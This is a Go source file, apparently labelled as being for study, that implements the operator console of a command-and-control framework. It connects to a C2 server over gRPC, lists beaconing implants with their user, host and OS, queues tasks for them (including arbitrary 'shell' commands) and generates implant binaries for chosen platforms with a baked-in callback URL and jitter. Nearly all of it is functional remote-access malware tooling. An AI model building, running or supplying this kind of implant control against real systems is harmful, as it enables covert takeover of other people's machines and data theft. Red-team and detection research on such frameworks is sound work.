// The C2 gRPC client binary. It connects to a running C2 server and provides
// an interactive console for remote beacon management.
package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"

	rpcTypes "xhc2_for_studying/server/rpc"
)

func main() {
	addr := flag.String("addr", "127.0.0.1:8025", "gRPC server address")
	flag.Parse()

	ctx := context.Background()
	client, err := rpcTypes.NewC2GRPCClient(ctx, *addr)
	if err != nil {
		log.Fatalf("connect to gRPC server: %v", err)
	}
	defer client.Close()

	fmt.Printf("[+] connected to %s\n", *addr)
	fmt.Println("type 'help' for commands")

	scanner := bufio.NewScanner(os.Stdin)
	fmt.Print("c2> ")
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			fmt.Print("c2> ")
			continue
		}
		parts := strings.Fields(line)
		cmd := parts[0]
		args := parts[1:]

		switch cmd {
		case "beacons":
			out, err := client.ListBeacons(ctx)
			if err != nil {
				fmt.Printf("error: %v\n", err)
				break
			}
			if len(out) == 0 {
				fmt.Println("(no beacons)")
				break
			}
			for _, b := range out {
				fmt.Printf("%s  %s@%s  %s/%s  interval=%ds jitter=%ds  last=%d\n",
					b.ID, b.Username, b.Hostname, b.OS, b.Arch, b.Interval, b.Jitter, b.LastCheckIn)
			}

		case "tasks":
			out, err := client.ListTasks(ctx)
			if err != nil {
				fmt.Printf("error: %v\n", err)
				break
			}
			if len(out) == 0 {
				fmt.Println("(no tasks)")
				break
			}
			for _, t := range out {
				fmt.Printf("%s  %s  %s  %s\n", t.TaskID, t.ImplantID, t.Type, t.Status)
			}

		case "task":
			if len(args) < 2 {
				fmt.Println("usage: task <type> <implant_id> [payload]")
			} else {
				req := rpcTypes.CreateTaskRequest{
					TaskType:  args[0],
					ImplantID: args[1],
				}
				if len(args) > 2 {
					req.Payload = strings.Join(args[2:], " ")
				}
				resp, err := client.CreateTask(ctx, req)
				if err != nil {
					fmt.Printf("error: %v\n", err)
					break
				}
				fmt.Printf("[+] created: %s\n", resp.TaskID)
			}

		case "generate":
			handleGenerate(ctx, client, args)

		case "result":
			if len(args) < 1 {
				fmt.Println("usage: result <task_id>")
			} else {
				req := rpcTypes.TaskResultRequest{TaskID: args[0]}
				resp, err := client.GetTaskResult(ctx, req)
				if err != nil {
					fmt.Printf("error: %v\n", err)
					break
				}
				fmt.Printf("Task ID:   %s\n", resp.TaskID)
				fmt.Printf("Type:      %s\n", resp.Type)
				fmt.Printf("Implant:   %s\n", resp.ImplantID)
				fmt.Printf("Status:    %s\n", resp.Status)
				if resp.Error != "" {
					fmt.Printf("Error:     %s\n", resp.Error)
				}
				if resp.Output != "" {
					fmt.Printf("Output:    %s\n", resp.Output)
				}
				if resp.Completed != "" {
					fmt.Printf("Completed: %s\n", resp.Completed)
				}
			}

		case "help":
			fmt.Println(mainHelpText())

		case "exit":
			fmt.Println("bye")
			return

		default:
			fmt.Printf("unknown command: %s (type help)\n", cmd)
		}
		fmt.Print("c2> ")
	}
}

func handleGenerate(ctx context.Context, client *rpcTypes.C2GRPCClient, args []string) {
	fs := flag.NewFlagSet("generate", flag.ContinueOnError)
	fs.SetOutput(os.Stdout)
	fs.Usage = func() {
		fmt.Fprintln(fs.Output(), generateUsageText())
	}

	serverURL := fs.String("server-url", "", "server URL baked into implant")
	pathPrefix := fs.String("path-prefix", "", "fixed URL path prefix prepended to implant C2 requests")
	interval := fs.Int64("interval", 0, "beacon check-in interval (seconds)")
	jitter := fs.Int64("jitter", 0, "beacon jitter (seconds)")
	goos := fs.String("os", "", "target OS")
	goarch := fs.String("arch", "", "target architecture")
	output := fs.String("out", "", "local implant output path")

	if err := fs.Parse(args); err != nil {
		return
	}

	req := rpcTypes.GenerateImplantRequest{
		ServerURL:  *serverURL,
		PathPrefix: *pathPrefix,
		Interval:   *interval,
		GOOS:       *goos,
		GOARCH:     *goarch,
	}
	if flagWasSet(fs, "jitter") {
		req.Jitter = jitter
	}

	resp, err := client.GenerateImplant(ctx, req)
	if err != nil {
		fmt.Printf("error: %v\n", err)
		return
	}
	outputPath := *output
	if outputPath == "" && resp.Filename != "" {
		outputPath = filepath.Join(".", resp.Filename)
	}
	if outputPath == "" {
		outputPath = defaultImplantOutputPath("", *goos, *goarch)
	}
	if err := os.WriteFile(outputPath, resp.Binary, 0755); err != nil {
		fmt.Printf("write output: %v\n", err)
		return
	}
	fmt.Printf("[+] generated: %s\n", outputPath)
	if resp.Digest != "" {
		fmt.Printf("[+] implant digest: %s\n", resp.Digest)
	}
}

func defaultImplantOutputPath(outputPath, goos, goarch string) string {
	if outputPath != "" {
		return outputPath
	}
	name := fmt.Sprintf("implant-%s-%s", goos, goarch)
	if goos == "windows" {
		name += ".exe"
	}
	return filepath.Join(".", name)
}

func mainHelpText() string {
	return strings.TrimSpace(`
commands:
  beacons                  list registered beacons
  tasks                    list pending tasks
  generate [options]       generate implant and save it locally
  task <type> <beacon> [payload]  create a task (type: noop, whoami, shell)
  result <task_id>         show task result
  help                     this message
  exit                     disconnect

generate examples:
  generate -h
  generate -server-url http://127.0.0.1:8024 -os linux -arch amd64 -out ./implant-linux
`)
}

func generateUsageText() string {
	return strings.TrimSpace(`
usage: generate [options]

options:
  -server-url string   server URL baked into implant
  -path-prefix string  fixed URL path prefix prepended to implant C2 requests
  -interval int        beacon check-in interval in seconds
  -jitter int          beacon jitter in seconds
  -os string           target OS
  -arch string         target architecture
  -out string          local implant output path
`)
}

func flagWasSet(fs *flag.FlagSet, name string) bool {
	wasSet := false
	fs.Visit(func(f *flag.Flag) {
		if f.Name == name {
			wasSet = true
		}
	})
	return wasSet
}
